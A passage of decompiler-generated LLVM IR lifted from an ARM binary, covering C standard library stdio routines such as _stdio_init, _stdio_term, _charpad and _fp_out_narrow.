  br i1 %v0_b7ec, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_b7ec
  %v5_b7ec = sdiv i32 %arg2, 16
  %v6_b7ec = and i32 %v5_b7ec, %arg1
  %v5_b7f0 = sdiv i32 %arg2, 256
  %v6_b7f0 = and i32 %v6_b7ec, %v5_b7f0
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_b7ec, %bb
  %v9_b7f4 = phi i32 [ %arg1, %dec_label_pc_b7ec ], [ %v6_b7f0, %bb ]
  ret i32 %v9_b7f4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_b824 = call i32 @__aeabi_read_tp()
  %v3_b828 = load i16, i16* @global_var_24070.401, align 2
  %v4_b828 = sext i16 %v3_b828 to i32
  store i32 %v4_b828, i32* @r3, align 4
  store i32 %v0_b824, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_b834 = add i32 %v4_b828, %v0_b824
  %v3_b834 = inttoptr i32 %v2_b834 to i32*
  %v4_b834 = load i32, i32* %v3_b834, align 4
  store i32 %v4_b834, i32* @r6, align 4
  %v1_b838 = call i32 @isatty(i32 0)
  %v2_b840 = icmp eq i32 %v1_b838, 0
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r4, align 4
  br i1 %v2_b840, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_b84c = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 1316) to i16*), align 4
  %v7_b84c = zext i16 %v5_b84c to i32
  %v2_b850 = xor i32 %v7_b84c, 256
  store i32 %v2_b850, i32* @r3, align 4
  %v2_b854 = trunc i32 %v2_b850 to i16
  store i16 %v2_b854, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 1316) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_b85c = call i32 @isatty(i32 1)
  %v2_b860 = icmp eq i32 %v1_b85c, 0
  br i1 %v2_b860, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_b868 = load i32, i32* @r4, align 4
  %v2_b86c = add i32 %v1_b868, 1384
  %v3_b86c = inttoptr i32 %v2_b86c to i16*
  %v4_b86c = load i16, i16* %v3_b86c, align 2
  %v2_b870 = xor i16 %v4_b86c, 256
  store i16 %v2_b870, i16* %v3_b86c, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_b87c = load i16, i16* @global_var_24070.401, align 2
  %v4_b87c = sext i16 %v3_b87c to i32
  %v0_b880 = load i32, i32* @r6, align 4
  %v1_b880 = load i32, i32* @r5, align 4
  %v3_b880 = add i32 %v1_b880, %v4_b87c
  %v4_b880 = inttoptr i32 %v3_b880 to i32*
  store i32 %v0_b880, i32* %v4_b880, align 4
  ret i32 %v1_b85c

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_b89c = load i32, i32* @r4, align 4
  store i32 %v3_b89c, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38960), i32* %r3.global-to-local, align 4
  %v2_b8b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38960) to i32*), align 4
  store i32 %v2_b8b0, i32* %r0.global-to-local, align 4
  %v5_b8b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38956) to i32*), align 4
  store i32 %v5_b8b0, i32* %r1.global-to-local, align 4
  %v8_b8b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38952) to i32*), align 4
  %v2_b8b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_b8b8, i32* %r3.global-to-local, align 4
  store i32 %v2_b8b0, i32* %stack_var_-44, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v4_b8c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 160) to i32*), align 4
  store i32 %v2_b8b0, i32* %r0.global-to-local, align 4
  store i32 %v5_b8b0, i32* %r1.global-to-local, align 4
  store i32 %v8_b8b0, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38972), i32* %r3.global-to-local, align 4
  %v1_b8d4 = inttoptr i32 %v4_b8c4 to i32*
  store i32 %v2_b8b0, i32* %v1_b8d4, align 4
  %v3_b8d4 = add i32 %v4_b8c4, 4
  %v4_b8d4 = inttoptr i32 %v3_b8d4 to i32*
  %v5_b8d4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_b8d4, i32* %v4_b8d4, align 4
  %v6_b8d4 = add i32 %v4_b8c4, 8
  %v7_b8d4 = inttoptr i32 %v6_b8d4 to i32*
  %v8_b8d4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_b8d4, i32* %v7_b8d4, align 4
  %v0_b8d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8d8 = inttoptr i32 %v0_b8d8 to i32*
  %v2_b8d8 = load i32, i32* %v1_b8d8, align 4
  store i32 %v2_b8d8, i32* %r0.global-to-local, align 4
  %v3_b8d8 = add i32 %v0_b8d8, 4
  %v4_b8d8 = inttoptr i32 %v3_b8d8 to i32*
  %v5_b8d8 = load i32, i32* %v4_b8d8, align 4
  store i32 %v5_b8d8, i32* %r1.global-to-local, align 4
  %v6_b8d8 = add i32 %v0_b8d8, 8
  %v7_b8d8 = inttoptr i32 %v6_b8d8 to i32*
  %v8_b8d8 = load i32, i32* %v7_b8d8, align 4
  %v2_b8dc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_b8dc, i32* %r3.global-to-local, align 4
  store i32 %v2_b8d8, i32* %stack_var_-56, align 4
  store i32 84, i32* %r2.global-to-local, align 4
  %v0_b8e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_b8e8 = add i32 %v0_b8e8, 84
  %v3_b8e8 = inttoptr i32 %v2_b8e8 to i32*
  %v4_b8e8 = load i32, i32* %v3_b8e8, align 4
  store i32 %v4_b8e8, i32* %r1.global-to-local, align 4
  store i32 168, i32* %r2.global-to-local, align 4
  %v1_b8f0 = inttoptr i32 %v4_b8e8 to i32*
  %v2_b8f0 = load i32, i32* %v1_b8f0, align 4
  store i32 %v2_b8f0, i32* %r5.global-to-local, align 4
  %v2_b8f4 = add i32 %v0_b8e8, 168
  %v3_b8f4 = inttoptr i32 %v2_b8f4 to i32*
  %v4_b8f4 = load i32, i32* %v3_b8f4, align 4
  store i32 %v2_b8d8, i32* %r0.global-to-local, align 4
  store i32 %v5_b8d8, i32* %r1.global-to-local, align 4
  store i32 %v8_b8d8, i32* %r2.global-to-local, align 4
  store i32 -38984, i32* %r3.global-to-local, align 4
  %v2_b904 = add i32 %v0_b8e8, -38984
  store i32 %v2_b904, i32* %sl.global-to-local, align 4
  %v1_b908 = inttoptr i32 %v4_b8f4 to i32*
  store i32 %v2_b8d8, i32* %v1_b908, align 4
  %v3_b908 = add i32 %v4_b8f4, 4
  %v4_b908 = inttoptr i32 %v3_b908 to i32*
  %v5_b908 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_b908, i32* %v4_b908, align 4
  %v6_b908 = add i32 %v4_b8f4, 8
  %v7_b908 = inttoptr i32 %v6_b908 to i32*
  %v8_b908 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_b908, i32* %v7_b908, align 4
  %v0_b998.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b99816 = icmp eq i32 %v0_b998.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_b9a018 = add i32 %v0_b998.pr, 56
  store i32 %v1_b9a018, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_b99816, label %dec_label_pc_b9ac, label %dec_label_pc_b910

dec_label_pc_b910:                                ; preds = %entry, %.thread10
  %v0_b910 = phi i32 [ %v3_b994, %.thread10 ], [ %v0_b998.pr, %entry ]
  %v1_b910 = add i32 %v0_b910, 64
  %v2_b910 = inttoptr i32 %v1_b910 to i32*
  %v3_b910 = load i32, i32* %v2_b910, align 4
  store i32 %v3_b910, i32* %r3.global-to-local, align 4
  %v0_b914 = call i32 @__aeabi_read_tp()
  store i32 %v0_b914, i32* %r0.global-to-local, align 4
  %v1_b918 = add i32 %v0_b914, -1168
  store i32 %v1_b918, i32* %r6.global-to-local, align 4
  %v3_b91c = icmp uge i32 %v3_b910, %v1_b918
  store i1 %v3_b91c, i1* %cpsr_c.global-to-local, align 1
  %v9_b91c = icmp eq i32 %v3_b910, %v1_b918
  br i1 %v9_b91c, label %.thread1, label %dec_label_pc_b930

.thread1:                                         ; preds = %dec_label_pc_b910
  %v1_b920 = load i32, i32* %r5.global-to-local, align 4
  %v2_b920 = add i32 %v1_b920, 60
  %v3_b920 = inttoptr i32 %v2_b920 to i32*
  %v4_b920 = load i32, i32* %v3_b920, align 4
  %v2_b924 = add i32 %v4_b920, 1
  store i32 %v2_b924, i32* %r3.global-to-local, align 4
  store i32 %v2_b924, i32* %v3_b920, align 4
  br label %.thread10

dec_label_pc_b930:                                ; preds = %dec_label_pc_b910, %dec_label_pc_b93c
  %v0_b930 = load i32, i32* %r2.global-to-local, align 4
  %v1_b930 = inttoptr i32 %v0_b930 to i32*
  %v2_b930 = load i32, i32* %v1_b930, align 4
  store i32 %v2_b930, i32* %r3.global-to-local, align 4
  %v1_b934 = load i32, i32* %r4.global-to-local, align 4
  %v3_b934 = icmp uge i32 %v2_b930, %v1_b934
  store i1 %v3_b934, i1* %cpsr_c.global-to-local, align 1
  %v9_b934 = icmp eq i32 %v2_b930, %v1_b934
  br i1 %v9_b934, label %dec_label_pc_b93c, label %dec_label_pc_b954

dec_label_pc_b93c:                                ; preds = %dec_label_pc_b930
  store i32 %v2_b930, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b94c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b94c, label %dec_label_pc_b950, label %dec_label_pc_b930

dec_label_pc_b950:                                ; preds = %dec_label_pc_b93c
  %v0_b950 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b950, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b954

dec_label_pc_b954:                                ; preds = %dec_label_pc_b930, %dec_label_pc_b950
  %v0_b954 = phi i32 [ %v0_b950, %dec_label_pc_b950 ], [ %v2_b930, %dec_label_pc_b930 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b954 = icmp eq i32 %v0_b954, 0
  %v2_b960.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_b954, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_b954
  %v1_b960 = load i32, i32* %r6.global-to-local, align 4
  %v3_b960 = add i32 %v2_b960.pre, 64
  %v4_b960 = inttoptr i32 %v3_b960 to i32*
  store i32 %v1_b960, i32* %v4_b960, align 4
  %v1_b964 = load i32, i32* %r1.global-to-local, align 4
  %v2_b964 = load i32, i32* %r5.global-to-local, align 4
  %v3_b964 = add i32 %v2_b964, 60
  %v4_b964 = inttoptr i32 %v3_b964 to i32*
  store i32 %v1_b964, i32* %v4_b964, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_b954
  %v2_b958 = add i32 %v2_b960.pre, 8
  %v3_b958 = inttoptr i32 %v2_b958 to i32*
  %v4_b958 = load i32, i32* %v3_b958, align 4
  store i32 %v4_b958, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_b968 = add i32 %v2_b960.pre, 20
  %v4_b968 = inttoptr i32 %v3_b968 to i32*
  store i32 %v4_b958, i32* %v4_b968, align 4
  %v1_b96c = load i32, i32* %r2.global-to-local, align 4
  %v2_b96c = trunc i32 %v1_b96c to i16
  %v3_b96c = load i32, i32* %r5.global-to-local, align 4
  %v4_b96c = inttoptr i32 %v3_b96c to i16*
  store i16 %v2_b96c, i16* %v4_b96c, align 2
  %v1_b970 = load i32, i32* %r3.global-to-local, align 4
  %v2_b970 = load i32, i32* %r5.global-to-local, align 4
  %v3_b970 = add i32 %v2_b970, 24
  %v4_b970 = inttoptr i32 %v3_b970 to i32*
  store i32 %v1_b970, i32* %v4_b970, align 4
  %v1_b974 = load i32, i32* %r3.global-to-local, align 4
  %v2_b974 = load i32, i32* %r5.global-to-local, align 4
  %v3_b974 = add i32 %v2_b974, 28
  %v4_b974 = inttoptr i32 %v3_b974 to i32*
  store i32 %v1_b974, i32* %v4_b974, align 4
  %v1_b978 = load i32, i32* %r3.global-to-local, align 4
  %v2_b978 = load i32, i32* %r5.global-to-local, align 4
  %v3_b978 = add i32 %v2_b978, 16
  %v4_b978 = inttoptr i32 %v3_b978 to i32*
  store i32 %v1_b978, i32* %v4_b978, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_b97c = load i32, i32* %sl.global-to-local, align 4
  %v1_b97c = inttoptr i32 %v0_b97c to i32*
  %v2_b97c = load i32, i32* %v1_b97c, align 4
  store i32 %v2_b97c, i32* %r0.global-to-local, align 4
  %v3_b97c = add i32 %v0_b97c, 4
  %v4_b97c = inttoptr i32 %v3_b97c to i32*
  %v5_b97c = load i32, i32* %v4_b97c, align 4
  store i32 %v5_b97c, i32* %r1.global-to-local, align 4
  %v6_b97c = add i32 %v0_b97c, 8
  %v7_b97c = inttoptr i32 %v6_b97c to i32*
  %v8_b97c = load i32, i32* %v7_b97c, align 4
  store i32 %v8_b97c, i32* %r2.global-to-local, align 4
  %v1_b984 = load i32, i32* %r5.global-to-local, align 4
  %v2_b984 = add i32 %v1_b984, 52
  %v3_b984 = inttoptr i32 %v2_b984 to i32*
  store i32 1, i32* %v3_b984, align 4
  %v0_b988 = load i32, i32* %r5.global-to-local, align 4
  %v1_b988 = add i32 %v0_b988, 56
  store i32 %v1_b988, i32* %r3.global-to-local, align 4
  %v2_b98c = load i32, i32* %r0.global-to-local, align 4
  %v1_b990 = inttoptr i32 %v1_b988 to i32*
  store i32 %v2_b98c, i32* %v1_b990, align 4
  %v3_b990 = add i32 %v0_b988, 60
  %v4_b990 = inttoptr i32 %v3_b990 to i32*
  %v5_b990 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_b990, i32* %v4_b990, align 4
  %v6_b990 = add i32 %v0_b988, 64
  %v7_b990 = inttoptr i32 %v6_b990 to i32*
  %v8_b990 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_b990, i32* %v7_b990, align 4
  %v0_b994 = load i32, i32* %r5.global-to-local, align 4
  %v1_b994 = add i32 %v0_b994, 32
  %v2_b994 = inttoptr i32 %v1_b994 to i32*
  %v3_b994 = load i32, i32* %v2_b994, align 4
  store i32 %v3_b994, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b998 = icmp eq i32 %v3_b994, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_b9a0 = add i32 %v3_b994, 56
  store i32 %v1_b9a0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_b998, label %dec_label_pc_b9ac, label %dec_label_pc_b910

dec_label_pc_b9ac:                                ; preds = %.thread10, %entry
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_b9b0 = load i32, i32* %r7.global-to-local, align 4
  %v2_b9b0 = add i32 %v0_b9b0, 84
  %v3_b9b0 = inttoptr i32 %v2_b9b0 to i32*
  %v4_b9b0 = load i32, i32* %v3_b9b0, align 4
  store i32 %v4_b9b0, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_b9b0 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b9d014 = icmp eq i32 %storemerge12, 0
  br i1 %v2_b9d014, label %dec_label_pc_b9d8, label %dec_label_pc_b9bc

dec_label_pc_b9bc:                                ; preds = %dec_label_pc_b9ac, %dec_label_pc_b9d0
  %v1_b9c4 = phi i32 [ %storemerge, %dec_label_pc_b9d0 ], [ %storemerge12, %dec_label_pc_b9ac ]
  %v1_b9bc = inttoptr i32 %v1_b9c4 to i16*
  %v2_b9bc = load i16, i16* %v1_b9bc, align 2
  %v3_b9bc = zext i16 %v2_b9bc to i32
  store i32 %v3_b9bc, i32* %r3.global-to-local, align 4
  %v1_b9c0 = and i32 %v3_b9bc, 64
  %v2_b9c0 = icmp eq i32 %v1_b9c0, 0
  br i1 %v2_b9c0, label %dec_label_pc_b9d0, label %bb39

bb39:                                             ; preds = %dec_label_pc_b9bc
  store i32 %v1_b9c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9d0

dec_label_pc_b9d0:                                ; preds = %dec_label_pc_b9bc, %bb39
  %v1_b9c8 = xor i1 %v2_b9c0, true
  call void @__pseudo_cond_branch(i1 %v1_b9c8, i32 ptrtoint (i32* @global_var_ba00.454 to i32))
  %v0_b9cc = load i32, i32* %r4.global-to-local, align 4
  %v1_b9cc = add i32 %v0_b9cc, 32
  %storemerge.in = inttoptr i32 %v1_b9cc to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b9d0 = icmp eq i32 %storemerge, 0
  br i1 %v2_b9d0, label %dec_label_pc_b9d8, label %dec_label_pc_b9bc

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9d0, %dec_label_pc_b9ac
  %v2_b9dc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_b9dc, i32* %r4.global-to-local, align 4
  %v1_b9e0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_b9e0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_b994, { 1, 2, 3, 0 }
  uselistorder i32 %v1_b934, { 1, 0 }
  uselistorder i32 %v4_b8f4, { 2, 1, 0 }
  uselistorder i32 %v4_b8c4, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 10, 1, 11, 9, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 5, 6, 7, 4, 2, 3, 0 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 7, 6, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_b9d0, { 1, 0 }
  uselistorder label %dec_label_pc_b9bc, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b954, { 1, 0 }
  uselistorder label %dec_label_pc_b930, { 1, 0 }
  uselistorder label %dec_label_pc_b910, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ba00 = load i32, i32* @r4, align 4
  store i32 %v3_ba00, i32* %stack_var_-8, align 4
  %v0_ba04 = load i32, i32* @r0, align 4
  %v1_ba04 = add i32 %v0_ba04, 8
  %v2_ba04 = inttoptr i32 %v1_ba04 to i32*
  %v3_ba04 = load i32, i32* %v2_ba04, align 4
  store i32 %v3_ba04, i32* @r1, align 4
  %v1_ba08 = add i32 %v0_ba04, 16
  %v2_ba08 = inttoptr i32 %v1_ba08 to i32*
  %v3_ba08 = load i32, i32* %v2_ba08, align 4
  %v9_ba0c = icmp eq i32 %v3_ba08, %v3_ba04
  store i32 %v0_ba04, i32* %r4.global-to-local, align 4
  br i1 %v9_ba0c, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_ba04, i32* %v2_ba08, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_ba18 = xor i1 %v9_ba0c, true
  call void @__pseudo_cond_branch(i1 %v1_ba18, i32 ptrtoint (i32* @global_var_12d34.455 to i32))
  %v0_ba1c = load i32, i32* %r4.global-to-local, align 4
  %v1_ba1c = add i32 %v0_ba1c, 8
  %v2_ba1c = inttoptr i32 %v1_ba1c to i32*
  %v3_ba1c = load i32, i32* %v2_ba1c, align 4
  store i32 %v3_ba1c, i32* @r3, align 4
  %v1_ba20 = add i32 %v0_ba1c, 16
  %v2_ba20 = inttoptr i32 %v1_ba20 to i32*
  %v3_ba20 = load i32, i32* %v2_ba20, align 4
  %v2_ba24 = sub i32 %v3_ba20, %v3_ba1c
  %v2_ba28 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ba28, i32* @r4, align 4
  ret i32 %v2_ba24

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_ba30 = load i32, i32* @r4, align 4
  %v6_ba30 = load i32, i32* @r5, align 4
  %v9_ba30 = load i32, i32* @r6, align 4
  %v12_ba30 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_ba3c = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_ba3c, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_ba542 = icmp eq i32 %arg3, 0
  store i32 1, i32* @r1, align 4
  br i1 %v2_ba542, label %dec_label_pc_ba74, label %dec_label_pc_ba68

dec_label_pc_ba50:                                ; preds = %dec_label_pc_ba68
  %v1_ba50 = add i32 %v0_ba50, -1
  store i32 %v1_ba50, i32* @r4, align 4
  %v2_ba54 = icmp eq i32 %v1_ba50, 0
  store i32 1, i32* @r1, align 4
  %v0_ba60 = load i32, i32* @r7, align 4
  br i1 %v2_ba54, label %dec_label_pc_ba74.loopexit, label %dec_label_pc_ba68

dec_label_pc_ba68:                                ; preds = %entry, %dec_label_pc_ba50
  %v0_ba604 = phi i32 [ %v0_ba60, %dec_label_pc_ba50 ], [ %arg1, %entry ]
  %v3_ba68 = inttoptr i32 %v0_ba604 to i16*
  %v4_ba68 = call i32 @__stdio_fwrite(i32 %v10_ba3c, i32 1, i16* %v3_ba68)
  %v7_ba6c = icmp eq i32 %v4_ba68, 1
  %v0_ba50 = load i32, i32* @r4, align 4
  br i1 %v7_ba6c, label %dec_label_pc_ba50, label %dec_label_pc_ba74.loopexit

dec_label_pc_ba74.loopexit:                       ; preds = %dec_label_pc_ba50, %dec_label_pc_ba68
  %v0_ba74.ph = phi i32 [ %v0_ba50, %dec_label_pc_ba68 ], [ 0, %dec_label_pc_ba50 ]
  %v1_ba74.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ba74

dec_label_pc_ba74:                                ; preds = %dec_label_pc_ba74.loopexit, %entry
  %v1_ba74 = phi i32 [ 0, %entry ], [ %v1_ba74.pre, %dec_label_pc_ba74.loopexit ]
  %v0_ba74 = phi i32 [ 0, %entry ], [ %v0_ba74.ph, %dec_label_pc_ba74.loopexit ]
  %v2_ba74 = sub i32 %v1_ba74, %v0_ba74
  store i32 %v3_ba30, i32* @r4, align 4
  store i32 %v6_ba30, i32* @r5, align 4
  store i32 %v9_ba30, i32* @r6, align 4
  store i32 %v12_ba30, i32* @r7, align 4
  ret i32 %v2_ba74

; uselistorder directives
  uselistorder i32 %v1_ba50, { 1, 0 }
  uselistorder label %dec_label_pc_ba74.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_ba68, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_ba84 = load i32, i32* @r4, align 4
  store i32 %v3_ba84, i32* %stack_var_-24, align 4
  %v6_ba84 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_ba8c = and i32 %arg2, 128
  %v2_ba8c = icmp eq i32 %v1_ba8c, 0
  %v0_ba90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ba90, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_ba8c, label %dec_label_pc_bae0thread-pre-split, label %dec_label_pc_baa4

dec_label_pc_baa4:                                ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_baa8 = call i32 @strlen(i8* %arg4)
  store i32 %v3_baa8, i32* %r0.global-to-local, align 4
  %v1_baac = load i32, i32* %r4.global-to-local, align 4
  %v2_baac = sub i32 %v1_baac, %v3_baa8
  store i32 %v2_baac, i32* @r4, align 4
  store i32 %v3_baa8, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_baac, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_bac0

.thread:                                          ; preds = %dec_label_pc_baa4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_badc

dec_label_pc_bac0:                                ; preds = %dec_label_pc_baa4
  %v0_bac0 = load i32, i32* @r5, align 4
  %v1_bac0 = urem i32 %v0_bac0, 128
  %v0_bac4 = load i32, i32* @r8, align 4
  store i32 %v0_bac4, i32* %r0.global-to-local, align 4
  %v3_bacc = trunc i32 %v1_bac0 to i8
  %v4_bacc = call i32 @_charpad(i32 %v0_bac4, i8 %v3_bacc, i32 %v2_baac)
  store i32 %v4_bacc, i32* %r0.global-to-local, align 4
  %v1_bad0 = load i32, i32* @r4, align 4
  %v9_bad0 = icmp eq i32 %v4_bacc, %v1_bad0
  store i32 %v4_bacc, i32* %r5.global-to-local, align 4
  br i1 %v9_bad0, label %dec_label_pc_bac0.dec_label_pc_badc_crit_edge, label %dec_label_pc_bafc

dec_label_pc_bac0.dec_label_pc_badc_crit_edge:    ; preds = %dec_label_pc_bac0
  %v0_badc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_badc

dec_label_pc_badc:                                ; preds = %.thread, %dec_label_pc_bac0.dec_label_pc_badc_crit_edge
  %v0_badc = phi i32 [ %v0_badc.pre, %dec_label_pc_bac0.dec_label_pc_badc_crit_edge ], [ %v3_baa8, %.thread ]
  store i32 %v0_badc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bae0

dec_label_pc_bae0thread-pre-split:                ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_bae0

dec_label_pc_bae0:                                ; preds = %dec_label_pc_bae0thread-pre-split, %dec_label_pc_badc
  %v5_baec = phi i32 [ %arg3, %dec_label_pc_bae0thread-pre-split ], [ %v0_badc, %dec_label_pc_badc ]
  %tmp14 = icmp slt i32 %v5_baec, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_bae0
  br label %bb15

bb:                                               ; preds = %dec_label_pc_bae0
  %v5_bae8 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_bae8, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_12e10.456 to i32))
  %v0_baf8 = load i32, i32* %r5.global-to-local, align 4
  %v2_baf8 = add i32 %storemerge, %v0_baf8
  store i32 %v2_baf8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_bafc

dec_label_pc_bafc:                                ; preds = %dec_label_pc_bac0, %bb15
  %v0_bafc = phi i32 [ %v4_bacc, %dec_label_pc_bac0 ], [ %v2_baf8, %bb15 ]
  store i32 %v0_bafc, i32* %r0.global-to-local, align 4
  %v2_bb00 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_bb00, i32* %r4.global-to-local, align 4
  store i32 %v6_ba84, i32* %r5.global-to-local, align 4
  ret i32 %v0_bafc

; uselistorder directives
  uselistorder i32 %v0_bafc, { 1, 0 }
  uselistorder i32 %v0_badc, { 1, 0 }
  uselistorder i32 %v2_baac, { 1, 0, 2 }
